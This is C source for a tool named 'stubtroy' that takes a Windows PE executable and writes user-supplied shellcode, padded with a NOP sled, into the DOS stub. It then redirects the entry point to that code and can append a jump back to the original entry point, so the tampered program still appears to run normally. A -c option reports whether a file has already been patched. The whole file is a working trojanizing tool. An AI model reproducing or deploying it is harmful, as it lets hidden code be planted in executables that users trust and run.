#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


int flag_m, flag_c;

int getData(FILE* in,int i){
    int result;    
    fseek(in, i, SEEK_SET);    
    result = fgetc(in) + fgetc(in)*0x100 + fgetc(in)*0x10000 + fgetc(in)*0x1000000;
    return result;
}

int* makeSC(int i, int add){
    int k;
    int j;
    int slen;
    char* ptr;
    int* shellcode = (int*)malloc(sizeof(int)*i);
    char* scan = (char*)malloc(sizeof(char)*i*3);

    if(flag_m){
        printf("Typing the Shellcode. maximum length is %d\n here:", i-9);
    }else{
        printf("Typing the Shellcode. maximum length is %d\n here:", i);
    }
    
    gets(scan);
    slen = strlen(scan)/3;

    for(k=0; k<=(i-slen)/2; k++){
        shellcode[k] = 144;
    }

    ptr = strtok(scan, " ");
    j = strtol(ptr, NULL, 16);
    shellcode[k]=j;

    while(ptr != NULL){
        k = k + 1;
        ptr = strtok(NULL, " "); 
        j = strtol(ptr, NULL, 16);
        shellcode[k]=j;        
    }

    if(flag_m){
            shellcode[k] = 0x6a;
        k = k + 1;
            shellcode[k] = 0x01;
        k = k + 1;
            shellcode[k] = 0xb8; 
        k = k + 1;
            shellcode[k] = (add / 0x1) % 0x100;    
        k = k + 1;
            shellcode[k] = (add / 0x100) % 0x100;    
        k = k + 1;
            shellcode[k] = (add / 0x10000) % 0x100;    
        k = k + 1;
            shellcode[k] = add / 0x1000000;    
        
        k = k + 1;
            shellcode[k] = 0xff;    
        k = k + 1;
            shellcode[k] = 0xd0;    
        k = k + 1;
    }

    for(k=k; k<i; k++){
        shellcode[k] = 65;
    }

    printf("shellcode:\n");
    for(k=0; k<i; k++){
        printf("%02x ", shellcode[k]);
    }    
    return shellcode;
}


int main(int argc, char* argv[]){
    
    if(argc < 2){
        printf("Usage : stubtroy [input_file] [output_file] [options]\n                options \n                -m      Insert code to return to main function.\n                -c      check this file is stubtroyed");
        return 0;
    }
    FILE* in;
    FILE* out;
    int ch, nt_point, st_size, ImageBase, add_pointer, add_ori, st_point;
    if((in = fopen(argv[1], "rb")) == NULL){
        fputs("can't read file", stderr);
        exit(1);
    }
    
    if((out = fopen(argv[2], "wb")) == NULL){
        fputs("can't write file", stderr);
        exit(1);
    } 
    
    if((getData(in, 0) / 0x1) % 0x10000 != 0x5a4d){
        printf("this is not Window execute program");
        return 0;
    }

    nt_point = getData(in, 0x3c);
    //printf("nt location : 10->%d 16->%02x\n", nt_point, nt_point);

    st_size = nt_point - 0x40;
    //printf("stub size : 10->%d 16->%02x\n", st_size, st_size);

    int* shellcode = (int*)malloc(sizeof(int)*st_size); 
    
    ImageBase = getData(in, nt_point + 0x34);
    //printf("Image Base : 10->%d 16->%02x\n", ImageBase, ImageBase);

    add_pointer = getData(in, nt_point + 0x28);
    //printf("Address of Entry Point : 10->%d 16->%02x\n", add_pointer, add_pointer);

    add_ori = ImageBase + add_pointer;
    //printf("Original Start Point : 10->%d 16->%02x\n", add_ori, add_ori);

    st_point = 0x40;
    //printf("Stub Start Point : 10->%d 16->%02x\n", st_point, st_point);

    int c;
    while((c = getopt(argc, argv, "mc")) != -1){
        switch(c) {
            case 'm':
                flag_m = 1;
                break;
            case 'c':
                flag_c = 1;                
                break;
            case '?':
                printf("Unknown option : %c", optopt);
                break;
        }
    }

    if(flag_c){
        if(add_pointer<0x400){
            printf("this file is stubtroyed\n");
        }else{
            printf("this file is not stubtroyed\n");
        }
    }else{
        shellcode = makeSC(st_size, add_ori);


        printf("\n\n");

        
        //dos header write
        int i;
        fseek(in, 0, SEEK_SET);
        for(i=0; i<=0x3f; i++){
            ch = fgetc(in);  
            fwrite(&ch,1,1,out);
        }

        //dos stub write
        for(i=0; i<st_size; i++){
            fwrite(&shellcode[i], 1, 1, out);
        }

        //nt header write
        fseek(in, st_size, SEEK_CUR);
        for(i=0; i<=39; i++){
            ch = fgetc(in);  
            fwrite(&ch,1,1,out);
        }
        //address point
        ch = fgetc(in);
        ch = fgetc(in);
        ch = fgetc(in);
        ch = fgetc(in);
        fwrite(&st_point, sizeof(st_point), 1, out);
        //tail
        while(feof(in) == 0){
            ch = fgetc(in);  
            fwrite(&ch,1,1,out);
        }
        
        fclose(out);
        fclose(in);
        
        }
    return 0;
}

